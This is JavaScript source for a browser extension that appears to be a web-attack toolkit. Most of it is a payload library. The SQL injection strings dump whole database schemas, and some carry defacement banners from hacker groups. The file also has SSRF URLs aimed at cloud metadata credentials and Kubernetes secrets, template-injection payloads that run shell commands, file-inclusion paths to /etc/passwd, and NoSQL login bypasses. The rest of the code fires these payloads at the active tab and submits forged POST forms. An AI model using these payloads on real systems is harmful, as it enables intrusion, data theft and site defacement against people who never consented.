			{ name: "Shariq", code: "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)" },
			{ name: "UMarShaH", code: "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)" },
			{ name: "Al!3N", code: "/*!50000ConCAt*//**/(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f692e6962622e636f2f59666b4d4d6d342f4d43532e706e67222077696474683d2233353022206865696768743d22333530223e,0x3c63656e7465723e3c666f6e7420636f6c6f723d626c75652073697a653d343e3c623e3c696e733e3c6c6567656e64207374796c653d22636f6c6f723a7265643b223e3e2d3d3e20496e6a656374656420427920416c69656e205368616e75207c204d616c6c7520437962657220536f6c6469657273203c3d2d3c203c2f6c6567656e643e3c2f696e733e3c6d61726b3e3c666f6e7420636f6c6f723d626c75653e7b204d4353207d3c2f666f6e743c2f6d61726b3e203c2f666f6e743e3c2f63656e7465723e3c2f623e3c62723e3c6d617271756565206265686176696f723d227363726f6c6c2220646972656374696f6e3d22766572746963616c22207363726f6c6c616d6f756e743d22313022207363726f6c6c64656c61793d223630222077696474683d2231303025223e202d2d3e204d414c4c5520435942455220534f4c444945525320212121203c2d2d203c2f666f6e743e3c623e3c2f623e3c2f6d6172717565653e3c2f666f6e743e3c62723e3c62723e,0x3c63656e7465723e3c68333e3c666f6e7420636f6c6f723d22726564223e56657273696f6e203a3a3a,version/***/(),0x3c62723e,0x55736572203a3a3a,user/**/(),0x3c62723e,0x6461746162617365203a3a3a,database/**/(),0x3c62723e,0x55554944204b657973203a3a3a,UUID/**/(),0x3c62723e,0x546d70646972203a3a3a,@@tmpdir/**/,0x3c62723e,0x64617461646972203a3a3a,@@datadir/**/,0x3c62723e,0x62617365646972203a3a3a,@@basedir/**/,0x3c62723e,0x53796d6c696e6b203a3a3a,@@GLOBAL.have_symlink/**/,0x3c62723e,0x53534c203a3a3a,@@GLOBAL.have_ssl/**/,0x3c62723e,0x706f7274203a3a3a,@@port/**/,0x3c62723e,0x736f636b6574203a3a3a,@@SOCKET/**/,0x3c62723e,0x706c7567696e646972203a3a3a,@@PLUGIN_DIR/***/,0x3c62723e7761697474696d656f7574203a3a3a,@@WAIT_TIMEOUT/***/,0x3c62723e747970656f73203a3a3a,@@VERSION_COMPILE_MACHINE/**/,0x3c62723e736572766572206f73203a3a3a,@@VERSION_COMPILE_OS/**/,0x3c62723e736574646972203a3a3a,@@CHARACTER_SETS_DIR/**/,0x3c62723e7265636f7665726f7074696f6e73203a3a3a,@@MYISAM_RECOVER_OPTIONS/**/,0x3c62723e636f6e6e656374696f6e203a3a3a,@@COLLATION_CONNECTION/**/,0x3c62723e6572726f726c6f67203a3a3a,@@LOG_ERROR/*_**/,0x3c62723e486f73746e616d65203a3a3a,@@hostname,0x3c62723e,0x3c696e733e3c64656c3e7b3c7375703e414c21334e3c2f7375703e204d414c4c5520435942455220534f4c44494552533c7375703e5348414e553c2f7375703e207d3c2f64656c3e3c2f696e733e3c2f666f6e743e,0x3c63656e7465723e3c68333e3c666f6e7420636f6c6f723d22726564223e416c69656e205368616e7520c2a920323031393c2f666f6e743e3c2f68333e3c68333e3c7072653e3c666f6e7420636f6c6f723d22626c7565223e7c204d43537c3c2f7072653e3c2f68333e2093c68333e3c7072653e3c666f6e7420636f6c6f723d22677265656e223e207c204d616c6c7520437962657220536f6c64696572737c3c2f666f6e743e3c2f7072653e3c2f68333e2093c68333e3c7072653e3c666f6e7420636f6c6f723d22677265656e223e207c20414c21334e207c3c2f666f6e743e3c2f7072653e3c2f68333e209203c62723e203c64697620636c6173733d22666f6f746572223e3c666f6e7420636f6c6f723d227768697465223e26636f70793b2032303139202d20efbfbd203c62723e3c2f6469763e203c62723e203c2f63656e7465723e209203c646976207374796c653d22646973706c61793a206e6f6e653b223e203c696672616d652077696474683d22302522206865696768743d223022207363726f6c6c696e673d226e6f22206672616d65626f726465723d226e6f22206c6f6f703d22747275652220616c6c6f773d226175746f706c617922207372633d2268747470733a2f2f632e746f7034746f702e6e65742f6d5f313038383976373562312e6d7033223e3c2f696672616d653e)" },
			{ name: "ALienSHANU", code: "concat/*!(0x3c68323e20496e6a656374657220414c49454e205348414e553c2f68323e,0x3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/" },
			{ name: "MCS", code: "(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))" },
			{ name: "Cobra", code: "concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/" },
			{ name: "Dh4ni", code: "concat(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070346c613a3a4772656574277320546f20416c6c204861636b6572277320203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d353e44622056657273696f6e203a,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e506f7274203a,@@PORT,0x3c62723e436865636b2069662053796d6c696e6b206973204f4e203a,@@HAVE_SYMLINK,0x3c62723e536572766572204f73204465746563746564203a,@@VERSION_COMPILE_OS,0x3c62723e436865636b207768696368204f70657261746f72732063616e20626520757365204572726f723a,@@FT_BOOLEAN_SYNTAX,0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))" },
			{ name: "DEWANGGA", code: " concat(@w:=0,(select count(*)from information_schema.columns e INNER JOIN information_schema.schemata d ON e.table_schema=d.schema_name and d.schema_name=Database() and@w:=concat(@w,0x3c62723e,ifnull(cast(table_name as char),0),0x20202623313230333b26233832343b2623313230323b26233832343b2623313230333b2020,ifnull(cast(column_name as char),0))),@w) " },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" },
			{ name: "", code: "" }
        ],
		postgredios: [
            { name: "AllVer", code: "(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))" },
			{ name: "8.4", code: "(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))" },
            { name: "9.1", code: "(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))" }
			],
		localdios: [
            { name: "DIOS1", code: "(/*!00024SeLeCt/**8**/*/(@x)/*!00024from/**8**/*/(/*!00024SeLeCt/**8**/*/(@x:=0x00),(SeLeCt(0)/*!From/**8**/*/(/*!00024information_schema.columns/**8**/*/)/*!00024where/**8**/*/(table_schema=database/**8**/()) and (0x00) in (@x:=/*!00024coNcat/**8**/*/(@x,0x3c6c693e,/*!00024table_name/**8**/*/,0x3a3a,/*!00024column_name/**8**/*/))))x)" },
			{ name: "MadBlood@x", code: "and @x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT" },
            { name: "LogicVariable", code: "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)" }
        ],
		mssql: [
            { name: "Rummy/Zen", code: ";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='Injected by Ali Khan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Ali1 END--" }
        ],
		
        error: [
            { name: "updxml-Ver", code: "and updatexml(1,concat(0x7e,(select @@version),0x7e),1)-- -" },
            { name: "updxml-DB", code: "and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -" },
            { name: "updxml-Tb", code: "and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)---- -" },
            { name: "updxml-TbColm", code: "and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)" }
        ],
        xss: [
			{ name: "Script", code: "\"><script>alert(1)</script>", desc: "XSS Alert" }
		],
		ssrf: [
			{ name: "AWS Metadata", code: "http://169.254.169.254/latest/meta-data/", desc: "AWS Instance Info" },
            { name: "GCP Metadata", code: "http://metadata.google.internal/computeMetadata/v1/", desc: "Google Cloud Info" },
            { name: "IP (Decimal)", code: "http://2130706433/", desc: "127.0.0.1 in Decimal" },
            { name: "IP (Hex)", code: "http://0x7f000001/", desc: "127.0.0.1 in Hex" },
            { name: "DNS Bypass", code: "http://127.0.0.1.nip.io", desc: "Wildcard DNS bypass" },
            { name: "Redirect Bypass", code: "http://attacker.com/redirect", desc: "Open Redirect to SSRF" },
            { name: "Path Confusion", code: "http://localhost@evil.com", desc: "@ bypass technique" },
            { name: "Protocol: Gopher", code: "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A", desc: "Gopher Protocol for SSRF" }
		],
		ssrf_rce: [
            { name: "AWS Keys", code: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", desc: "Get IAM Role & Keys" },
            { name: "Jenkins RCE", code: "http://127.0.0.1:8080/job/build?token=secret", desc: "Execute Jenkins Job" },
            { name: "K8s Secrets", code: "http://10.96.0.1/api/v1/namespaces/default/secrets/", desc: "Kubernetes Secrets" },
            { name: "Docker API", code: "http://127.0.0.1:2375/containers/json", desc: "Docker Remote API" },
            { name: "Redis RCE", code: "dict://127.0.0.1:6379/info", desc: "Redis Command Injection" },
            { name: "PHP FastCGI", code: "gopher://127.0.0.1:9000/_%01%01...", desc: "FastCGI RCE (Complex)" },
            { name: "Internal Config", code: "http://127.0.0.1:9090/config/update", desc: "Force Config Update" }
        ],
        lfi: [
			{ name: "Passwd", code: "/../../../../etc/passwd%00" },
			{ name: "Linux Passwd", code: "/etc/passwd", desc: "Basic LFI" },
			{ name: "Filter Bypass", code: "php://filter/convert.base64-encode/resource=config.php", desc: "PHP Base64 Filter" },
			{ name: "Log Poisoning", code: "/var/log/apache2/access.log", desc: "Apache Log" },
			{ name: "Proc Self", code: "/proc/self/environ", desc: "Env variables" },
			{ name: "Windows Boot", code: "C:/boot.ini", desc: "Windows LFI" }
		],
		ssti: [
            { name: "Detection (Universal)", code: "{{7*7}}${7*7}<%= 7*7 %>", desc: "Identify Engine" },
            { name: "Jinja2/Python", code: "{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}", desc: "Python RCE" },
            { name: "Twig (PHP)", code: "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}", desc: "PHP Twig RCE" },
            { name: "Java (Freemarker)", code: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", desc: "Java RCE" },
            { name: "Node.js (EJS)", code: "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>", desc: "Node.js RCE" },
            { name: "Object Access (Config)", code: "{{config.items()}}", desc: "Dump Config Variables" }
        ],
		blind: [
            { name: "Time-Blind (MySQL)", code: " and if(1=1, sleep(5), 0)-- -" },
			{ name: "Time-Blind (PgSQL)", code: " and case when (1=1) then pg_sleep(5) else null end-- -" },
			{ name: "Time-Blind (MSSQL)", code: " WAITFOR DELAY '00:00:05'-- -" },
			{ name: "Boolean Blind", code: " and (select 1 from users where user='admin' and length(password)>10)=1-- -" }
        ],
		nosql: [
            { name: "Auth Bypass ($ne)", code: '{"$ne": null}', desc: "Not Equal bypass for login" },
            { name: "Auth Bypass ($gt)", code: '{"$gt": ""}', desc: "Greater than bypass" },
            { name: "Regex Match", code: '{"$regex": ".*"}', desc: "Match anything" },
            { name: "Check Admin", code: '{"username": "admin", "password": {"$ne": "1"}}', desc: "Login as admin bypass" },
            { name: "Blind String", code: '{"$regex": "^a"}', desc: "Blind NoSQL - Start with 'a'" },
			{ name: "NoSQL Login", code: 'username[$ne]=admin&password[$ne]=admin', desc: "Bypass Login with $ne" },
            { name: "JSON Auth", code: '{"username": {"$gt": ""}, "password": {"$gt": ""}}', desc: "JSON Greater Than Auth" },
            { name: "NoSQL Blind", code: '[$regex]=^a.*', desc: "Start with 'a'" },
            { name: "$where Injection", code: "'+(this.password.length > 0)+'", desc: "JavaScript Injection via $where" }
        ]
    };

    function init() {
        // 1. Encoding buttons
        const encMap = {
            'btn_enc_url': encoder.urlEnc, 'btn_dec_url': encoder.urlDec,
            'btn_enc_hex': encoder.hexEnc, 'btn_dec_hex': encoder.hexDec,
            'btn_enc_b64': encoder.b64Enc, 'btn_dec_b64': encoder.b64Dec,
            'btn_reverse': encoder.reverse
        };
        Object.entries(encMap).forEach(([id, fn]) => {
            const el = document.getElementById(id);
            if (el) el.onclick = (e) => { e.preventDefault(); fn(); };
        });

        // 2. Panels generation
        Object.keys(predatorData).forEach(key => {
            const panel = document.getElementById(`${key}_panel`);
            const menu = document.getElementById(`menu_${key}`);
            
            if (panel) {
                panel.innerHTML = '';
                predatorData[key].forEach(p => {
                    const btn = document.createElement('button');
                    btn.className = 'quick-btn';
                    btn.textContent = p.name;
                    btn.title = p.desc || p.code || "";
                    btn.onclick = (e) => {
                        e.preventDefault();
                        if (p.func) p.func();
                        else if (p.code) insertAtCursor(p.code);
                    };
                    panel.appendChild(btn);
                });
            }

            if (menu) {
                menu.onclick = () => {
                    document.querySelectorAll('.menu-item').forEach(m => m.classList.remove('active'));
                    menu.classList.add('active');
                    document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
                    const target = document.getElementById(`${key}_panel`);
                    if (target) target.style.display = 'flex';
                };
            }
        });

        // 3. GET/URL Control
        const btnLoad = document.getElementById('btn_load');
        if (btnLoad) {
            btnLoad.onclick = async (e) => {
                e.preventDefault();
                let [tab] = await chrome.tabs.query({active: true, currentWindow: true});
                if (tab?.url) { 
                    urlBox.value = decodeURIComponent(tab.url); 
                    status.textContent = "[+] URL Loaded."; 
                    urlBox.focus();
                }
            };
        }

        const btnSplit = document.getElementById('btn_split');
        if (btnSplit) {
            btnSplit.onclick = () => {
                if (urlBox.value.includes('?')) {
                    let [base, params] = urlBox.value.split('?');
                    urlBox.value = `${base}?\n${params.split('&').join('\n&')}`;
                    status.textContent = "[+] Parameters Splitted.";
                }
            };
        }

        const btnExec = document.getElementById('btn_execute');
        if (btnExec) {
            btnExec.onclick = () => {
                if (urlBox.value) chrome.tabs.update({url: urlBox.value.replace(/\n/g, '')});
            };
        }
    }
	///
	
	const btnExecPost = document.getElementById('btn_execute_post');
	const postBox = document.getElementById('post_box');

	if (btnExecPost) {
    btnExecPost.onclick = async () => {
        const url = urlBox.value.replace(/\n/g, '');
        const postData = postBox.value;

        if (!url) return alert("URL အရင်ထည့်ပါ!");

        // Current Tab ထဲမှာ Form တစ်ခု create လုပ်ပြီး Submit လုပ်တဲ့ logic (Bypass CORS)
        let [tab] = await chrome.tabs.query({active: true, currentWindow: true});
        
        chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: (targetUrl, data) => {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = targetUrl;

                // data ကို parameter ခွဲပြီး hidden input တွေနဲ့ ထည့်မယ်
                const params = new URLSearchParams(data);
                for (const [key, value] of params) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = value;
                    form.appendChild(input);
                }
                document.body.appendChild(form);
                form.submit();
            },
            args: [url, postData]
        });
        status.textContent = "[+] POST Executed!";
    };
	}

    init();
});

// --- Shortcut Keys ---
window.addEventListener('keydown', (e) => {
    const urlBox = document.getElementById('url_box');
    if (e.altKey && e.key.toLowerCase() === 'x') {
        e.preventDefault();
        if (urlBox.value) chrome.tabs.update({ url: urlBox.value.replace(/\n/g, '') });
    }
    if (e.ctrlKey && e.key.toLowerCase() === 'z') {
        if (document.activeElement !== urlBox) urlBox.focus();
    }
}, true);
